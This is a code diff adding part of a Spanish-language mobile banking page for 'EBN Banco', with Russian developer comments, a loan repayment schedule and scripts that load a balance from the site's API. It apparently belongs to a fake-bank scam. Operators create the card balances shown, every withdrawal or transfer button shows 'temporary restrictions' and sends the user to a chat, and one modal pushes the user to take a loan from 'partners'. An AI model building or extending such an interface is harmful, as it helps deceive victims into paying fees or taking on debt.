+          <path d="M19.9975 10.2514C19.8075 10.2514 19.6175 10.1814 19.4675 10.0314L17.4675 8.03141C17.1775 7.74141 17.1775 7.26141 17.4675 6.97141C17.7575 6.68141 18.2375 6.68141 18.5275 6.97141L20.5275 8.97141C20.8175 9.26141 20.8175 9.74141 20.5275 10.0314C20.3775 10.1814 20.1875 10.2514 19.9975 10.2514Z" fill="currentColor"/>
+        </svg>
+        <span>Historial</span>
+      </a>
+      <a href="./chat.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M17 20.5H7C4 20.5 2 19 2 15.5V8.5C2 5 4 3.5 7 3.5H17C20 3.5 22 5 22 8.5V15.5C22 19 20 20.5 17 20.5Z" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M17 9L13.87 11.5C12.84 12.32 11.15 12.32 10.12 11.5L7 9" stroke="currentColor" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span>Chat</span>
+      </a>
+      <a href="./support.html" class="tourist-tabbar__item">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M8 22.3214C7.72 22.3214 7.42998 22.2514 7.16998 22.1114C6.59998 21.8114 6.25 21.2113 6.25 20.5714V19.1514C3.23 18.8414 1.25 16.6213 1.25 13.4413V7.44141C1.25 4.00141 3.56 1.69141 7 1.69141H17C20.44 1.69141 22.75 4.00141 22.75 7.44141V13.4413C22.75 16.8813 20.44 19.1913 17 19.1913H13.23L8.96997 22.0314C8.67997 22.2214 8.34 22.3214 8 22.3214ZM7 3.1814C4.42 3.1814 2.75 4.8514 2.75 7.4314V13.4315C2.75 16.0115 4.42 17.6815 7 17.6815C7.41 17.6815 7.75 18.0215 7.75 18.4315V20.5615C7.75 20.6915 7.83 20.7514 7.88 20.7814C7.93001 20.8114 8.03001 20.8414 8.14001 20.7714L12.59 17.8115C12.71 17.7315 12.86 17.6815 13.01 17.6815H17.01C19.59 17.6815 21.26 16.0115 21.26 13.4315V7.4314C21.26 4.8514 19.59 3.1814 17.01 3.1814H7Z" fill="currentColor"/>
+          <path d="M12.0037 12.1094C11.5937 12.1094 11.2537 11.7694 11.2537 11.3594V11.1494C11.2537 9.98941 12.1037 9.4194 12.4237 9.1994C12.7937 8.9494 12.9137 8.77941 12.9137 8.51941C12.9137 8.01941 12.5037 7.60938 12.0037 7.60938C11.5037 7.60938 11.0938 8.01941 11.0938 8.51941C11.0938 8.92941 10.7537 9.26941 10.3438 9.26941C9.93375 9.26941 9.59375 8.92941 9.59375 8.51941C9.59375 7.18941 10.6737 6.10938 12.0037 6.10938C13.3337 6.10938 14.4137 7.18941 14.4137 8.51941C14.4137 9.65941 13.5737 10.2294 13.2637 10.4394C12.8737 10.6994 12.7537 10.8694 12.7537 11.1494V11.3594C12.7537 11.7794 12.4137 12.1094 12.0037 12.1094Z" fill="currentColor"/>
+          <path d="M12 14.6016C11.58 14.6016 11.25 14.2616 11.25 13.8516C11.25 13.4416 11.59 13.1016 12 13.1016C12.41 13.1016 12.75 13.4416 12.75 13.8516C12.75 14.2616 12.42 14.6016 12 14.6016Z" fill="currentColor"/>
+        </svg>
+        <span>Soporte</span>
+      </a>
+    </nav>
+
+    <!-- Modal: función no disponible (стиль как newcomer) -->
+    <div class="transfer-modal" id="touristUnavailableModal" aria-hidden="true">
+      <div class="transfer-modal__backdrop" data-transfer-modal-close tabindex="-1"></div>
+      <div
+        class="transfer-modal__dialog"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="touristUnavailableModalTitle"
+      >
+        <div class="transfer-modal__text">
+          <h2 class="transfer-modal__title" id="touristUnavailableModalTitle">Función no disponible</h2>
+          <p class="transfer-modal__desc">Primero intenta solicitar un préstamo con nuestros socios.</p>
+        </div>
+        <div class="transfer-modal__actions">
+          <button type="button" class="transfer-modal__btn" data-transfer-modal-close>
+            <span>Activar</span>
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path
+                d="M5.9375 13.2788L10.2842 8.93208C10.7975 8.41875 10.7975 7.57875 10.2842 7.06542L5.9375 2.71875"
+                stroke="white"
+                stroke-width="1.5"
+                stroke-miterlimit="10"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+            </svg>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal: Plan de pagos (график платежей) -->
+    <div class="tourist-contract-modal" id="planScheduleModal" aria-hidden="true">
+      <div class="tourist-contract-modal__backdrop" data-plan-schedule-close tabindex="-1"></div>
+      <section
+        class="tourist-contract-modal__panel"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="planScheduleModalTitle"
+      >
+        <header class="tourist-contract-modal__header">
+          <div class="tourist-contract-modal__heading">
+            <h2 class="tourist-contract-modal__title" id="planScheduleModalTitle">Plan de pagos</h2>
+          </div>
+        </header>
+
+        <div class="tourist-contract-modal__body" tabindex="0">
+          <article class="credit-contract" aria-label="Plan de pagos">
+            <section class="credit-contract__page">
+              <h4 class="credit-contract__section-title">6. Plan de pagos</h4>
+              <div class="credit-contract__rule" aria-hidden="true"></div>
+              <p class="credit-contract__mono">
+                Tasa mensual: 0,006550000000<br>
+                Cuota mensual: 101.05<br>
+                Importe total de pagos: 6 062.71<br>
+                Importe de sobrepago: 1 062.71
+              </p>
+
+              <table class="credit-contract__table credit-contract__table--schedule">
+                <thead>
+                  <tr>
+                    <th>Mes</th>
+                    <th>Cuota</th>
+                    <th>Intereses</th>
+                    <th>Amortización</th>
+                    <th>Saldo</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>1</td><td>€ 101.05</td><td>€ 32.75</td><td>€ 68.30</td><td>€ 4 931.70</td></tr>
+                  <tr><td>2</td><td>€ 101.05</td><td>€ 32.30</td><td>€ 68.75</td><td>€ 4 862.95</td></tr>
+                  <tr><td>3</td><td>€ 101.05</td><td>€ 31.85</td><td>€ 69.20</td><td>€ 4 793.75</td></tr>
+                  <tr><td>4</td><td>€ 101.05</td><td>€ 31.40</td><td>€ 69.65</td><td>€ 4 724.10</td></tr>
+                  <tr><td>5</td><td>€ 101.05</td><td>€ 30.94</td><td>€ 70.11</td><td>€ 4 653.99</td></tr>
+                  <tr><td>6</td><td>€ 101.05</td><td>€ 30.48</td><td>€ 70.57</td><td>€ 4 583.42</td></tr>
+                  <tr><td>7</td><td>€ 101.05</td><td>€ 30.02</td><td>€ 71.03</td><td>€ 4 512.39</td></tr>
+                  <tr><td>8</td><td>€ 101.05</td><td>€ 29.56</td><td>€ 71.49</td><td>€ 4 440.90</td></tr>
+                  <tr><td>9</td><td>€ 101.05</td><td>€ 29.09</td><td>€ 71.96</td><td>€ 4 368.94</td></tr>
+                  <tr><td>10</td><td>€ 101.05</td><td>€ 28.62</td><td>€ 72.43</td><td>€ 4 296.51</td></tr>
+                  <tr><td>11</td><td>€ 101.05</td><td>€ 28.14</td><td>€ 72.91</td><td>€ 4 223.60</td></tr>
+                  <tr><td>12</td><td>€ 101.05</td><td>€ 27.66</td><td>€ 73.39</td><td>€ 4 150.21</td></tr>
+                  <tr><td>13</td><td>€ 101.05</td><td>€ 27.18</td><td>€ 73.87</td><td>€ 4 076.34</td></tr>
+                  <tr><td>14</td><td>€ 101.05</td><td>€ 26.70</td><td>€ 74.35</td><td>€ 4 001.99</td></tr>
+                  <tr><td>15</td><td>€ 101.05</td><td>€ 26.21</td><td>€ 74.84</td><td>€ 3 927.15</td></tr>
+                  <tr><td>16</td><td>€ 101.05</td><td>€ 25.72</td><td>€ 75.33</td><td>€ 3 851.82</td></tr>
+                  <tr><td>17</td><td>€ 101.05</td><td>€ 25.23</td><td>€ 75.82</td><td>€ 3 776.00</td></tr>
+                  <tr><td>18</td><td>€ 101.05</td><td>€ 24.73</td><td>€ 76.32</td><td>€ 3 699.68</td></tr>
+                  <tr><td>19</td><td>€ 101.05</td><td>€ 24.23</td><td>€ 76.82</td><td>€ 3 622.86</td></tr>
+                  <tr><td>20</td><td>€ 101.05</td><td>€ 23.73</td><td>€ 77.32</td><td>€ 3 545.54</td></tr>
+                  <tr><td>21</td><td>€ 101.05</td><td>€ 23.22</td><td>€ 77.83</td><td>€ 3 467.71</td></tr>
+                  <tr><td>22</td><td>€ 101.05</td><td>€ 22.71</td><td>€ 78.34</td><td>€ 3 389.37</td></tr>
+                  <tr><td>23</td><td>€ 101.05</td><td>€ 22.20</td><td>€ 78.85</td><td>€ 3 310.52</td></tr>
+                  <tr><td>24</td><td>€ 101.05</td><td>€ 21.68</td><td>€ 79.37</td><td>€ 3 231.15</td></tr>
+                  <tr><td>25</td><td>€ 101.05</td><td>€ 21.16</td><td>€ 79.89</td><td>€ 3 151.26</td></tr>
+                  <tr><td>26</td><td>€ 101.05</td><td>€ 20.64</td><td>€ 80.41</td><td>€ 3 070.85</td></tr>
+                  <tr><td>27</td><td>€ 101.05</td><td>€ 20.11</td><td>€ 80.94</td><td>€ 2 989.91</td></tr>
+                  <tr><td>28</td><td>€ 101.05</td><td>€ 19.58</td><td>€ 81.47</td><td>€ 2 908.44</td></tr>
+                  <tr><td>29</td><td>€ 101.05</td><td>€ 19.05</td><td>€ 82.00</td><td>€ 2 826.44</td></tr>
+                  <tr><td>30</td><td>€ 101.05</td><td>€ 18.51</td><td>€ 82.54</td><td>€ 2 743.90</td></tr>
+                  <tr><td>31</td><td>€ 101.05</td><td>€ 17.97</td><td>€ 83.08</td><td>€ 2 660.82</td></tr>
+                  <tr><td>32</td><td>€ 101.05</td><td>€ 17.43</td><td>€ 83.62</td><td>€ 2 577.20</td></tr>
+                  <tr><td>33</td><td>€ 101.05</td><td>€ 16.88</td><td>€ 84.17</td><td>€ 2 493.03</td></tr>
+                  <tr><td>34</td><td>€ 101.05</td><td>€ 16.33</td><td>€ 84.72</td><td>€ 2 408.31</td></tr>
+                  <tr><td>35</td><td>€ 101.05</td><td>€ 15.77</td><td>€ 85.28</td><td>€ 2 323.03</td></tr>
+                  <tr><td>36</td><td>€ 101.05</td><td>€ 15.22</td><td>€ 85.83</td><td>€ 2 237.20</td></tr>
+                  <tr><td>37</td><td>€ 101.05</td><td>€ 14.65</td><td>€ 86.40</td><td>€ 2 150.80</td></tr>
+                  <tr><td>38</td><td>€ 101.05</td><td>€ 14.09</td><td>€ 86.96</td><td>€ 2 063.84</td></tr>
+                  <tr><td>39</td><td>€ 101.05</td><td>€ 13.52</td><td>€ 87.53</td><td>€ 1 976.31</td></tr>
+                  <tr><td>40</td><td>€ 101.05</td><td>€ 12.94</td><td>€ 88.11</td><td>€ 1 888.20</td></tr>
+                  <tr><td>41</td><td>€ 101.05</td><td>€ 12.37</td><td>€ 88.68</td><td>€ 1 799.52</td></tr>
+                  <tr><td>42</td><td>€ 101.05</td><td>€ 11.79</td><td>€ 89.26</td><td>€ 1 710.26</td></tr>
+                  <tr><td>43</td><td>€ 101.05</td><td>€ 11.20</td><td>€ 89.85</td><td>€ 1 620.41</td></tr>
+                  <tr><td>44</td><td>€ 101.05</td><td>€ 10.61</td><td>€ 90.44</td><td>€ 1 529.97</td></tr>
+                  <tr><td>45</td><td>€ 101.05</td><td>€ 10.02</td><td>€ 91.03</td><td>€ 1 438.94</td></tr>
+                  <tr><td>46</td><td>€ 101.05</td><td>€ 9.43</td><td>€ 91.62</td><td>€ 1 347.32</td></tr>
+                  <tr><td>47</td><td>€ 101.05</td><td>€ 8.82</td><td>€ 92.23</td><td>€ 1 255.09</td></tr>
+                  <tr><td>48</td><td>€ 101.05</td><td>€ 8.22</td><td>€ 92.83</td><td>€ 1 162.26</td></tr>
+                  <tr><td>49</td><td>€ 101.05</td><td>€ 7.61</td><td>€ 93.44</td><td>€ 1 068.82</td></tr>
+                  <tr><td>50</td><td>€ 101.05</td><td>€ 7.00</td><td>€ 94.05</td><td>€ 974.77</td></tr>
+                  <tr><td>51</td><td>€ 101.05</td><td>€ 6.38</td><td>€ 94.67</td><td>€ 880.10</td></tr>
+                  <tr><td>52</td><td>€ 101.05</td><td>€ 5.76</td><td>€ 95.29</td><td>€ 784.81</td></tr>
+                  <tr><td>53</td><td>€ 101.05</td><td>€ 5.14</td><td>€ 95.91</td><td>€ 688.90</td></tr>
+                  <tr><td>54</td><td>€ 101.05</td><td>€ 4.51</td><td>€ 96.54</td><td>€ 592.36</td></tr>
+                  <tr><td>55</td><td>€ 101.05</td><td>€ 3.88</td><td>€ 97.17</td><td>€ 495.19</td></tr>
+                  <tr><td>56</td><td>€ 101.05</td><td>€ 3.24</td><td>€ 97.81</td><td>€ 397.38</td></tr>
+                  <tr><td>57</td><td>€ 101.05</td><td>€ 2.60</td><td>€ 98.45</td><td>€ 298.93</td></tr>
+                  <tr><td>58</td><td>€ 101.05</td><td>€ 1.96</td><td>€ 99.09</td><td>€ 199.84</td></tr>
+                  <tr><td>59</td><td>€ 101.05</td><td>€ 1.31</td><td>€ 99.74</td><td>€ 100.10</td></tr>
+                  <tr><td>60</td><td>€ 100.76</td><td>€ 0.66</td><td>€ 100.10</td><td>€ 0.00</td></tr>
+                </tbody>
+              </table>
+            </section>
+          </article>
+        </div>
+
+        <footer class="tourist-contract-modal__footer">
+          <button type="button" class="tourist-contract-modal__action" data-plan-schedule-close>
+            <span class="tourist-contract-modal__action-content">
+              <span class="tourist-contract-modal__action-text">Cerrar</span>
+              <svg class="tourist-contract-modal__action-icon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M12 4 4 12M4 4l8 8" stroke="#FFFFFF" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </span>
+          </button>
+        </footer>
+      </section>
+    </div>
+
+    <!-- Bottom Sheet: Acciones (Activar / Transferencia) -->
+    <div class="tourist-sheet" id="touristSheet" aria-hidden="true">
+      <div class="tourist-sheet__backdrop" id="touristSheetBackdrop"></div>
+      <div class="tourist-sheet__panel" role="dialog" aria-modal="true" aria-labelledby="touristSheetTitle">
+        <div class="tourist-sheet__handle"></div>
+        <div class="tourist-sheet__content">
+
+          <div class="tourist-sheet__icon" aria-hidden="true">
+           <svg width="52" height="52" viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+<rect width="52" height="52" rx="12" fill="url(#paint0_linear_30646_10906)"/>
+<path d="M26.0032 32.2408C27.0535 32.2408 27.9049 31.3894 27.9049 30.3392C27.9049 29.2889 27.0535 28.4375 26.0032 28.4375C24.953 28.4375 24.1016 29.2889 24.1016 30.3392C24.1016 31.3894 24.953 32.2408 26.0032 32.2408Z" fill="white"/>
+<path d="M33.3293 23.117V21.6587C33.3293 18.5087 32.5709 14.332 26.0026 14.332C19.4343 14.332 18.6759 18.5087 18.6759 21.6587V23.117C15.4093 23.5254 14.3359 25.182 14.3359 29.2537V31.4237C14.3359 36.207 15.7943 37.6654 20.5776 37.6654H31.4276C36.2109 37.6654 37.6693 36.207 37.6693 31.4237V29.2537C37.6693 25.182 36.5959 23.5254 33.3293 23.117ZM26.0026 33.862C24.0543 33.862 22.4793 32.2754 22.4793 30.3387C22.4793 28.3904 24.0659 26.8154 26.0026 26.8154C27.9393 26.8154 29.5259 28.402 29.5259 30.3387C29.5259 32.287 27.9509 33.862 26.0026 33.862ZM20.5776 23.012C20.4843 23.012 20.4026 23.012 20.3093 23.012V21.6587C20.3093 18.2404 21.2776 15.9654 26.0026 15.9654C30.7276 15.9654 31.6959 18.2404 31.6959 21.6587V23.0237C31.6026 23.0237 31.5209 23.0237 31.4276 23.0237H20.5776V23.012Z" fill="white"/>
+<defs>
+<linearGradient id="paint0_linear_30646_10906" x1="52" y1="26" x2="1.13535e-07" y2="26" gradientUnits="userSpaceOnUse">
+<stop stop-color="#FF77D7"/>
+<stop offset="1" stop-color="#FA6C12"/>
+</linearGradient>
+</defs>
+</svg>
+
+          </div>
+
+          <div class="tourist-sheet__texts">
+            <h2 class="tourist-sheet__title" id="touristSheetTitle">Se han aplicado restricciones temporales</h2>
+            <p class="tourist-sheet__desc">Para eliminar las restricciones sobre la retirada de fondos, póngase en contacto con el servicio de atención al cliente a través del chat.</p>
+          </div>
+
+          <button type="button" class="tourist-sheet__btn-call" id="touristSheetCallBtn" onclick="location.href='./chat.html'; return false;">
+            <span id="touristSheetCallText">Abrir chat</span>
+            <svg class="tourist-sheet__call-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path d="M17 20.5H7C4 20.5 2 19 2 15.5V8.5C2 5 4 3.5 7 3.5H17C20 3.5 22 5 22 8.5V15.5C22 19 20 20.5 17 20.5Z" stroke="white" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M17 9L13.87 11.5C12.84 12.32 11.15 12.32 10.12 11.5L7 9" stroke="white" stroke-width="1.5" stroke-miterlimit="10" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+
+          <button type="button" class="tourist-sheet__btn-close" id="touristSheetCloseBtn">
+            <span>Más tarde</span>
+          </button>
+
+        </div>
+      </div>
+    </div>
+
+  
+
+    <script src="./tourist.js?v=20260609-3"></script>
+    <script>
+      (function () {
+        var KEY = 'touristDemoNoticeSeen';
+        var modal = document.getElementById('touristDemoModal');
+        if (!modal) return;
+        var seen = false;
+        try { seen = sessionStorage.getItem(KEY) === '1'; } catch (e) {}
+        if (seen) return;
+        modal.classList.add('tourist-demo-modal--open');
+        modal.setAttribute('aria-hidden', 'false');
+        function close() {
+          modal.classList.remove('tourist-demo-modal--open');
+          modal.setAttribute('aria-hidden', 'true');
+          try { sessionStorage.setItem(KEY, '1'); } catch (e) {}
+        }
+        var okBtn = document.getElementById('touristDemoModalOk');
+        var backdrop = document.getElementById('touristDemoModalBackdrop');
+        if (okBtn) okBtn.addEventListener('click', close);
+        if (backdrop) backdrop.addEventListener('click', close);
+      })();
+    </script>
+    <script>
+      (function () {
+        var titleEl = document.getElementById("touristBankTitle");
+        if (titleEl) { titleEl.textContent = "EBN Banco"; titleEl.style.opacity = '1'; }
+
+        var logo = "../banks/newBank/icon.svg";
+        var logoWrap = document.getElementById("touristBankLogoWrap");
+        if (logoWrap) {
+          var img = document.createElement("img");
+          img.src = logo;
+          img.alt = "EBN Banco";
+          img.style.cssText = "width:36px;height:36px;object-fit:contain;border-radius:50%;display:block;";
+          logoWrap.innerHTML = "";
+          logoWrap.appendChild(img);
+        }
+
+        var planLogo = document.getElementById("touristPlanBankLogo");
+        if (planLogo) { planLogo.src = logo; planLogo.alt = "EBN Banco"; }
+      })();
+    </script>
+    <script>
+      // —— Переключение "cuenta principal" между счетами ——
+      // Замок остаётся привязан к EBN Banco (кредитный счёт) всегда,
+      // независимо от того, какой счёт сейчас Principal и на какой позиции он стоит.
+      (function () {
+        var wrap = document.getElementById("touristAccountsList");
+        var mainBank = document.getElementById("homeMainBank");
+        var secondaryBank = document.getElementById("homeSecondaryBank");
+        if (!wrap || !mainBank || !secondaryBank) return;
+
+        // Выбор основного счёта сохраняем, чтобы он не сбрасывался после перезагрузки.
+        var sid = "";
+        try { sid = (window.getFlowSessionId && window.getFlowSessionId()) || localStorage.getItem("flowSessionId") || ""; } catch (e) {}
+        var PRINCIPAL_KEY = "touristPrincipalAccount:" + sid;
+        var principal = "main"; // main | secondary
+        try {
+          var savedPrincipal = localStorage.getItem(PRINCIPAL_KEY);
+          if (savedPrincipal === "secondary" || savedPrincipal === "main") principal = savedPrincipal;
+        } catch (e) {}
+
+        function makePrincipalTriggerHtml() {
+          return (
+            '<button type="button" class="tourist-bank__make-principal" data-make-principal>' +
+            "<span>Hacer principal</span>" +
+            '<svg width="10" height="10" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">' +
+            '<path d="M4 10l4-4 4 4" stroke="#0F0F0F" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>' +
+            "</svg></button>"
+          );
+        }
+
+        function render() {
+          var mainSlot = mainBank.querySelector("[data-principal-slot]");
+          var secSlot = secondaryBank.querySelector("[data-principal-slot]");
+          if (mainSlot) mainSlot.innerHTML = principal === "main" ? '<span class="tourist-bank__principal">Principal</span>' : makePrincipalTriggerHtml();
+          if (secSlot) secSlot.innerHTML = principal === "secondary" ? '<span class="tourist-bank__principal">Principal</span>' : makePrincipalTriggerHtml();
+          // Счёт-Principal всегда идёт первым в списке; замок при этом
+          // не переносится — он часть разметки homeMainBank и остаётся на месте.
+          if (principal === "secondary") wrap.insertBefore(secondaryBank, mainBank);
+          else wrap.insertBefore(mainBank, secondaryBank);
+        }
+
+        wrap.addEventListener("click", function (e) {
+          var trigger = e.target.closest("[data-make-principal]");
+          if (!trigger) return;
+          var card = trigger.closest(".tourist-bank");
+          if (!card) return;
+          principal = card.id === "homeSecondaryBank" ? "secondary" : "main";
+          try { localStorage.setItem(PRINCIPAL_KEY, principal); } catch (e) {}
+          render();
+        });
+
+        render();
+      })();
+    </script>
+    <script>
+      (function () {
+        // —— Bottom Sheet (Activar / Transferencia) ——
+        var sheet = document.getElementById("touristSheet");
+        var sheetBackdrop = document.getElementById("touristSheetBackdrop");
+        var sheetCallBtn = document.getElementById("touristSheetCallBtn");
+        var sheetCallText = document.getElementById("touristSheetCallText");
+        var sheetCloseBtn = document.getElementById("touristSheetCloseBtn");
+
+        function openSheet() {
+          sheet.classList.add("tourist-sheet--open");
+          sheet.setAttribute("aria-hidden", "false");
+          document.body.classList.add("tourist-sheet-open");
+        }
+
+        function closeSheet() {
+          sheet.classList.remove("tourist-sheet--open");
+          sheet.setAttribute("aria-hidden", "true");
+          document.body.classList.remove("tourist-sheet-open");
+        }
+
+        sheetBackdrop.addEventListener("click", closeSheet);
+        sheetCloseBtn.addEventListener("click", closeSheet);
+
+        sheetCallBtn.addEventListener("click", function () {
+          window.location.href = "./chat.html";
+        });
+
+        document.addEventListener("keydown", function (e) {
+          if (e.key === "Escape" && sheet.classList.contains("tourist-sheet--open")) closeSheet();
+        });
+
+        var activar = document.getElementById("activarBtn");
+        if (activar) {
+          activar.addEventListener("click", function () {
+            openSheet();
+          });
+        }
+
+        var transfer = document.getElementById("transferBtn");
+        if (transfer) {
+          transfer.addEventListener("click", function () {
+            openSheet();
+          });
+        }
+
+        // —— Открытие/закрытие модалки графика ——
+        var modal = document.getElementById("planScheduleModal");
+        if (modal) {
+          var body = modal.querySelector(".tourist-contract-modal__body");
+          function openSchedule() {
+            modal.classList.add("tourist-contract-modal--open");
+            modal.setAttribute("aria-hidden", "false");
+            document.body.classList.add("contract-modal-open");
+            if (body) body.scrollTop = 0;
+          }
+          function closeSchedule() {
+            modal.classList.remove("tourist-contract-modal--open");
+            modal.setAttribute("aria-hidden", "true");
+            document.body.classList.remove("contract-modal-open");
+          }
+          document.querySelectorAll("[data-plan-schedule-open]").forEach(function (el) {
+            el.addEventListener("click", function (e) {
+              e.preventDefault();
+              openSchedule();
+            });
+          });
+          modal.querySelectorAll("[data-plan-schedule-close]").forEach(function (el) {
+            el.addEventListener("click", function () {
+              closeSchedule();
+            });
+          });
+          document.addEventListener("keydown", function (e) {
+            if (e.key === "Escape" && modal.classList.contains("tourist-contract-modal--open")) {
+              closeSchedule();
+            }
+          });
+        }
+      })();
+    </script>
+    <script>
+      // Загружаем актуальный баланс с сервера
+      (function () {
+        var API_BASE = window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || window.location.origin;
+        var sessionId = (typeof window.getFlowSessionId === 'function')
+          ? window.getFlowSessionId()
+          : (localStorage.getItem('flowSessionId') || '');
+        if (!sessionId) return;
+        function fmtEur(v) {
+          var n = Number(v);
+          if (!isFinite(n)) n = 0;
+          var parts = Math.abs(n).toFixed(2).split('.');
+          parts[0] = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+          return parts[0] + ',' + parts[1];
+        }
+        function escapeHtml(s) {
+          return String(s == null ? '' : s)
+            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+        fetch(API_BASE.replace(/\/+$/, '') + '/api/tourist/balance/' + encodeURIComponent(sessionId), {
+          method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit',
+        })
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            var bal = data.balance != null ? data.balance : null;
+            var fmt = bal != null ? fmtEur(bal) : null;
+            var balEl = document.getElementById('touristBalance');
+            if (balEl && fmt != null) { balEl.textContent = fmt; balEl.style.opacity = '1'; }
+            var currEl = document.getElementById('touristBalanceCurrency');
+            if (currEl && fmt != null) currEl.style.opacity = '1';
+            var amtEl = document.getElementById('touristBankAmount');
+            if (amtEl && fmt != null) { amtEl.textContent = '€' + fmt; amtEl.style.opacity = '1'; }
+
+            var txs = (data && Array.isArray(data.transactions)) ? data.transactions : [];
+
+            // Debet-карта "Cuenta débito": появляется, только если оператор её создал
+            // (запись type === 'account_activation'). Баланс карты = 0 + пополнения
+            // (card_credit) − списания (card_debit); НИКАК не связан с основным балансом.
+            var hasCard = txs.some(function (t) { return t && t.type === 'account_activation'; });
+            if (hasCard) {
+              var cardBal = 0, cardLast4 = '2456';
+              txs.forEach(function (t) {
+                if (!t) return;
+                if (t.type === 'account_activation') { if (t.cardLast4) cardLast4 = t.cardLast4; cardBal += Number(t.amount) || 0; }
+                else if (t.type === 'card_credit') cardBal += Number(t.amount) || 0;
+                else if (t.type === 'card_debit') cardBal -= Number(t.amount) || 0;
+              });
+              if (cardBal < 0) cardBal = 0;
+              var secBank = document.getElementById('homeSecondaryBank');
+              var secMask = document.getElementById('homeSecondaryBankMask');
+              var secAmount = document.getElementById('homeSecondaryBankAmount');
+              if (secMask) secMask.textContent = 'Visa •••• ' + cardLast4;
+              if (secAmount) secAmount.textContent = '€' + fmtEur(cardBal);
+              if (secBank) secBank.style.display = '';
+            }
+
+            // Показываем последние списания в списке транзакций
+            if (!txs.length) return;
+            var list = document.getElementById('indexTxList');
+            if (!list) return;
+            // Статичный «Préstamo aprobado» — самый старый пункт (одобрение займа),
+            // должен оставаться внизу. Динамические операции ставим НАД ним, новыми сверху.
+            var loanAnchor = list.querySelector('.tourist-list-item');
+            var recent = txs.slice()
+              .filter(function (t) { return t && t.type !== 'account_activation'; })
+              .sort(function (a, b) { return new Date(b.date) - new Date(a.date); })
+              .slice(0, 3);
+            var debitIcon = '<div class="tourist-list-item__icon tourist-list-item__icon--debit" aria-hidden="true" style="width:32px;height:32px;flex:0 0 32px;border-radius:50%;background:#e8f0fe;display:flex;align-items:center;justify-content:center"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19.97 1.75H17.03C15.76 1.75 15 2.51 15 3.78V6.72C15 7.99 15.76 8.75 17.03 8.75H19.97C21.24 8.75 22 7.99 22 6.72V3.78C22 2.51 21.24 1.75 19.97 1.75ZM20.19 5.06C20.07 5.18 19.91 5.24 19.75 5.24C19.59 5.24 19.43 5.18 19.31 5.06L19.13 4.88V7.12C19.13 7.47 18.85 7.75 18.5 7.75C18.15 7.75 17.87 7.47 17.87 7.12V4.88L17.69 5.06C17.45 5.3 17.05 5.3 16.81 5.06C16.57 4.82 16.57 4.42 16.81 4.18L18.06 2.93C18.11 2.88 18.18 2.84 18.25 2.81C18.27 2.8 18.29 2.8 18.31 2.79C18.36 2.77 18.41 2.76 18.47 2.76C18.49 2.76 18.51 2.76 18.53 2.76C18.6 2.76 18.66 2.77 18.73 2.8C18.74 2.8 18.74 2.8 18.75 2.8C18.82 2.83 18.88 2.87 18.93 2.92C18.94 2.93 18.94 2.93 18.95 2.93L20.2 4.18C20.44 4.42 20.44 4.82 20.19 5.06Z" fill="white"/><path d="M2 11.46V16.46C2 18.75 3.85 20.6 6.14 20.6H17.85C20.14 20.6 22 18.74 22 16.45V11.46C22 10.79 21.46 10.25 20.79 10.25H3.21C2.54 10.25 2 10.79 2 11.46ZM8 17.25H6C5.59 17.25 5.25 16.91 5.25 16.5C5.25 16.09 5.59 15.75 6 15.75H8C8.41 15.75 8.75 16.09 8.75 16.5C8.75 16.91 8.41 17.25 8 17.25ZM14.5 17.25H10.5C10.09 17.25 9.75 16.91 9.75 16.5C9.75 16.09 10.09 15.75 10.5 15.75H14.5C14.91 15.75 15.25 16.09 15.25 16.5C15.25 16.91 14.91 17.25 14.5 17.25Z" fill="white"/><path d="M13.5 4.61002V7.54002C13.5 8.21002 12.96 8.75002 12.29 8.75002H3.21C2.53 8.75002 2 8.19002 2 7.52002C2.01 6.39002 2.46 5.36002 3.21 4.61002C3.96 3.86002 5 3.40002 6.14 3.40002H12.29C12.96 3.40002 13.5 3.94002 13.5 4.61002Z" fill="white"/></svg></div>';
